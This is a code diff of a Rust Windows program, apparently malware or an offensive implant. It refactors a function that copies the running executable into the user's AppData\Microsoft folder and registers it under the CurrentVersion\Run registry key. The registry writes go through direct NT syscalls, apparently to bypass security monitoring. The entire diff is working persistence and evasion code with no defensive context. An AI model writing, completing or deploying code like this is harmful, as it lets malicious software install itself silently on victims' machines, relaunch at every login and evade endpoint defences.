@@ -4,12 +4,11 @@ use std::io::Write;
 use std::path::Path;
 use std::ptr;
 use crate::syscalls::SYSCALLS;
-use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE};
+use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};
 #[cfg(target_pointer_width = "64")]
 use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
 #[cfg(target_pointer_width = "32")]
 use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;
-use windows_sys::Win32::System::SystemServices::IMAGE_NT_SIGNATURE;
 use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
 use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
 use windows_sys::Win32::Security::{GetTokenInformation, TOKEN_USER, TOKEN_QUERY};
@@ -21,71 +20,8 @@ use std::ffi::{c_void, OsString, OsStr};
 use std::os::windows::ffi::{OsStringExt, OsStrExt};
 use std::iter::once;
 
-pub fn get_image_size(base_address: *const u8) -> Option<usize> {
-    unsafe {
-        let dos_header = base_address as *const IMAGE_DOS_HEADER;
-        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
-            return None;
-        }
-
-        let nt_headers_ptr = base_address.add((*dos_header).e_lfanew as usize);
-
-        #[cfg(target_pointer_width = "64")]
-        {
-            let nt_headers = nt_headers_ptr as *const IMAGE_NT_HEADERS64;
-            if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
-                return None;
-            }
-            Some((*nt_headers).OptionalHeader.SizeOfImage as usize)
-        }
-        #[cfg(target_pointer_width = "32")]
-        {
-            let nt_headers = nt_headers_ptr as *const IMAGE_NT_HEADERS32;
-            if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
-                return None;
-            }
-            Some((*nt_headers).OptionalHeader.SizeOfImage as usize)
-        }
-    }
-}
-
-pub fn get_user_sid_string() -> Result<String, std::io::Error> {
-    let mut token_handle: HANDLE = 0;
-    if unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token_handle) } == 0 {
-        return Err(std::io::Error::last_os_error());
-    }
-
-    let mut return_length: u32 = 0;
-    unsafe { GetTokenInformation(token_handle, 1, ptr::null_mut(), 0, &mut return_length) };
-    if return_length == 0 {
-        return Err(std::io::Error::last_os_error());
-    }
-
-    let mut token_user_buffer: Vec<u8> = vec![0; return_length as usize];
-    let token_user = token_user_buffer.as_mut_ptr() as *mut TOKEN_USER;
-
-    if unsafe { GetTokenInformation(token_handle, 1, token_user as *mut _, return_length, &mut return_length) } == 0 {
-        return Err(std::io::Error::last_os_error());
-    }
-
-    let sid = unsafe { (*token_user).User.Sid };
-    let mut sid_string_ptr: *mut u16 = ptr::null_mut();
-    if unsafe { ConvertSidToStringSidW(sid, &mut sid_string_ptr) } == 0 {
-        return Err(std::io::Error::last_os_error());
-    }
-
-    let sid_string = unsafe {
-        let len = (0..).take_while(|&i| *sid_string_ptr.offset(i) != 0).count();
-        let slice = std::slice::from_raw_parts(sid_string_ptr, len);
-        OsString::from_wide(slice).to_string_lossy().into_owned()
-    };
-
-    unsafe { LocalFree(sid_string_ptr as isize) };
-
-    Ok(sid_string)
-}
-
 pub fn add_to_startup() -> Result<(), std::io::Error> {
+    // Persist executable to disk
     let appdata_path = env::var("APPDATA").map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;
     let persist_dir = Path::new(&appdata_path).join("Microsoft");
     fs::create_dir_all(&persist_dir)?;
@@ -96,20 +32,70 @@ pub fn add_to_startup() -> Result<(), std::io::Error> {
         return Err(std::io::Error::last_os_error());
     }
 
-    let image_size = get_image_size(base_address).ok_or_else(|| {
-        std::io::Error::new(std::io::ErrorKind::InvalidData, "Failed to get image size")
-    })?;
+    // Inlined get_image_size logic
+    let image_size = unsafe {
+        let dos_header = base_address as *const IMAGE_DOS_HEADER;
+        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
+            None
+        } else {
+            let nt_headers_ptr = base_address.add((*dos_header).e_lfanew as usize);
+            #[cfg(target_pointer_width = "64")]
+            {
+                let nt_headers = nt_headers_ptr as *const IMAGE_NT_HEADERS64;
+                if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
+                    None
+                } else {
+                    Some((*nt_headers).OptionalHeader.SizeOfImage as usize)
+                }
+            }
+            #[cfg(target_pointer_width = "32")]
+            {
+                let nt_headers = nt_headers_ptr as *const IMAGE_NT_HEADERS32;
+                if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
+                    None
+                } else {
+                    Some((*nt_headers).OptionalHeader.SizeOfImage as usize)
+                }
+            }
+        }
+    }.ok_or_else(|| std::io::Error::new(std::io::ErrorKind::InvalidData, "Failed to get image size"))?;
 
     let image_bytes = unsafe { std::slice::from_raw_parts(base_address, image_size) };
-
     let mut file = fs::File::create(&persist_path)?;
     file.write_all(image_bytes)?;
 
-    let user_sid = get_user_sid_string()?;
-    let key_path = format!(
-        "\\Registry\\User\\{}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-        user_sid
-    );
+    // Inlined get_user_sid_string logic, wrapped in a closure
+    let user_sid = (|| -> Result<String, std::io::Error> {
+        let mut token_handle: HANDLE = 0;
+        if unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token_handle) } == 0 {
+            return Err(std::io::Error::last_os_error());
+        }
+        let mut return_length: u32 = 0;
+        unsafe { GetTokenInformation(token_handle, 1, ptr::null_mut(), 0, &mut return_length) };
+        if return_length == 0 {
+            return Err(std::io::Error::last_os_error());
+        }
+        let mut token_user_buffer: Vec<u8> = vec![0; return_length as usize];
+        if unsafe { GetTokenInformation(token_handle, 1, token_user_buffer.as_mut_ptr() as *mut _, return_length, &mut return_length) } == 0 {
+            return Err(std::io::Error::last_os_error());
+        }
+        let token_user = token_user_buffer.as_ptr() as *const TOKEN_USER;
+        let sid = unsafe { (*token_user).User.Sid };
+        let mut sid_string_ptr: *mut u16 = ptr::null_mut();
+        if unsafe { ConvertSidToStringSidW(sid, &mut sid_string_ptr) } == 0 {
+            return Err(std::io::Error::last_os_error());
+        }
+        let sid_string = unsafe {
+            let len = (0..).take_while(|&i| *sid_string_ptr.offset(i) != 0).count();
+            let slice = std::slice::from_raw_parts(sid_string_ptr, len);
+            OsString::from_wide(slice).to_string_lossy().into_owned()
+        };
+        unsafe { LocalFree(sid_string_ptr as isize) };
+        Ok(sid_string)
+    })()?;
+
+    // Create registry key using direct syscalls
+    let key_path = format!("\\Registry\\User\\{}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", user_sid);
     let wide_key_path: Vec<u16> = OsStr::new(&key_path).encode_wide().chain(once(0)).collect();
     let mut key_path_unicode = UNICODE_STRING {
         Length: ((wide_key_path.len() - 1) * 2) as u16,
@@ -122,7 +108,7 @@ pub fn add_to_startup() -> Result<(), std::io::Error> {
         Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
         RootDirectory: 0,
         ObjectName: &mut key_path_unicode,
-        Attributes: 0x00000040,
+        Attributes: 0x00000040, // OBJ_CASE_INSENSITIVE
         SecurityDescriptor: ptr::null_mut(),
         SecurityQualityOfService: ptr::null_mut(),
     };
@@ -131,11 +117,11 @@ pub fn add_to_startup() -> Result<(), std::io::Error> {
     let status: NTSTATUS = unsafe {
         (SYSCALLS.NtCreateKey)(
             &mut key_handle,
-            0x00020006,
+            0x00020006, // KEY_SET_VALUE
             &mut object_attributes,
             0,
             ptr::null_mut(),
-            0,
+            0, // REG_OPTION_NON_VOLATILE
             &mut disposition,
         )
     };
@@ -153,23 +139,22 @@ pub fn add_to_startup() -> Result<(), std::io::Error> {
     };
 
     let wide_persist_path: Vec<u16> = persist_path.as_os_str().encode_wide().chain(once(0)).collect();
-
     let status = unsafe {
         (SYSCALLS.NtSetValueKey)(
             key_handle,
             &mut value_name_unicode,
             0,
-            1,
+            1, // REG_SZ
             wide_persist_path.as_ptr() as *mut _,
             (wide_persist_path.len() * 2) as u32,
         )
     };
 
+    unsafe { (SYSCALLS.NtClose)(key_handle as *mut _) };
+
     if status != 0 {
         return Err(std::io::Error::from_raw_os_error(status as i32));
     }
-
-    unsafe { (SYSCALLS.NtClose)(key_handle as *mut _) };
 
     Ok(())
 }
